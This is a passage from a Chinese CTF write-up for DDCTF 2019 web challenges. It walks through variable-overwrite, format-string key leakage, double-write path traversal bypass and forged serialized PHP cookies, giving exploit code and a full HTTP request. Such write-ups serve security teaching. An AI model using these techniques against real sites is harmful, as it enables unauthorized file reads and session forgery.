https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码除了文件包含外，并没有什么漏洞，源码上博客内容是关于shell下echo的一些特殊用法，对于php中的echo并不适用。作者另外一篇博客 <a href="https://blog.csdn.net/fengbanliuyun/article/details/80913909" target="_blank" rel="noopener">vim 异常退出 swp文件提示</a> 提到了<code>.practice.txt.swp</code></p><p>访问 <code>http://117.51.150.246/practice.txt.swp</code> 得到新的提示<code>f1ag!ddctf.php</code>。 </p><p>文件包含<code>f1ag!ddctf.php</code>，根据<code>index.php</code>的源代码，我们需要用<code>config</code>替换<code>!</code></p><p><a href="http://117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==" target="_blank" rel="noopener">http://117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在一个明显的变量覆盖漏洞，覆盖<code>$k</code>为空，同时将<code>$uid</code>也置为空即可。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418133702-fe36480e-619b-1.png" alt=""></p><h3 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h3><p>打开 <a href="http://117.51.158.44/index.php" target="_blank" rel="noopener">http://117.51.158.44/index.php</a> 后，提示<code>抱歉，您没有登陆权限，请获取权限后访问-----</code>，查看一下源代码，发现有<code>auth()</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/index.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">hljs.initHighlightingOnLoad();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"auth()"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'center'</span> <span class="attr">id</span>=<span class="string">"auth"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此函数在<code>http://117.51.158.44/js/index.js</code>中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"post"</span>,</span><br><span class="line">        url:<span class="string">"http://117.51.158.44/app/Auth.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/json;charset=utf-8"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span>,</span><br><span class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(<span class="string">"didictf_username"</span>, <span class="string">""</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(getdata);</span><br><span class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">''</span>) &#123;</span><br><span class="line">               <span class="built_in">document</span>.getElementById(<span class="string">'auth'</span>).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>burp抓包发现http包请求确实有个<code>didictf_username</code>字段，修改为<code>didictf_username: admin</code>后成功验证，提示访问<code>app/fL2XID2i0Cdh.php</code></p><p><a href="http://117.51.158.44/app/fL2XID2i0Cdh.php" target="_blank" rel="noopener">http://117.51.158.44/app/fL2XID2i0Cdh.php</a> 中内容如下：</p><p>url:app/Application.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>url:app/Session.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure><p>首先留意到<code>class Application</code>中有一个读取文件的地方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>路径要求18位，而<code>../config/flag.txt</code>刚好18位满足要求，基本可以确定flag的位置，<code>sanitizepath</code>会将<code>../</code>替换为空，可直接双写绕过过滤<code>....//config/flag.txt</code>。</p><p>然后在<code>class Session</code>中<code>session_read()</code>有反序列化的代码，只要触发反序列化就能到读取文件的地方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">    <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125;</span><br><span class="line">$hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">$session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">    <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125;</span><br><span class="line">$session = unserialize($session);</span><br></pre></td></tr></table></figure><p>其中<code>cookie_name</code>为<code>ddctf_id</code>，代码会对session内容进行校验，校验方法为最后32位的hash值，要等于<code>md5($this-&gt;eancrykey.$session)</code>，绕过验证需要泄露<code>$this-&gt;eancrykey</code>的值</p><p>留意到<code>session_read()</code>中有一段格式化字符的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">    $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">    $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        $data = sprintf($data,$v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里for循环会对<code>$data</code>进行两次格式化字符串操作，其中<code>nickname</code>我们可控，若<code>nickname=%s</code>，第二次格式化字符串就能把<code>$this-&gt;eancrykey</code>泄露出来。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418133741-15be2bd6-619c-1.png" alt=""></p><p>至此，伪造session的信息收集完毕，可以伪造session进行文件读取，代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">'....//config/flag.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Application();</span><br><span class="line">$key = <span class="string">'EzblrbNS'</span>;</span><br><span class="line">$cookie_name = <span class="string">'ddctf_id'</span>;</span><br><span class="line">$hash = md5($key.serialize($a));</span><br><span class="line"><span class="keyword">echo</span> serialize($a).$hash;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将代码生成的payload URL编码后发送</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /app/Session.php HTTP/1.1</span><br><span class="line">didictf_username: admin</span><br><span class="line">cookie: ddctf_id=O%3A11%3A%22Application%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A21%3A%22....%2F%2Fconfig%2Fflag.txt%22%3B%7D77cd55a8d29df4f005f85e536d876525</span><br></pre></td></tr></table></figure><p>发送后得到：<br><code>{&quot;errMsg&quot;:&quot;Congratulations&quot;,&quot;data&quot;:&quot;DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}&quot;}</code></p><h3 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://117.51.148.166/upload.php</span><br><span class="line"></span><br><span class="line">user：dd@ctf</span><br><span class="line">pass：DD@ctf#000</span><br></pre></td></tr></table></figure><p>登录后直接上传一张图片，提示未包含<code>phpinfo()</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418133835-35678a86-619c-1.png" alt=""></p><p>将图片下载下来，winhex打开看了一下，发现文件头有<code>gd-jpeg</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418133851-3f2ef2b6-619c-1.png" alt=""></p><p>搜索一下发现GD库图片渲染存在漏洞，<a 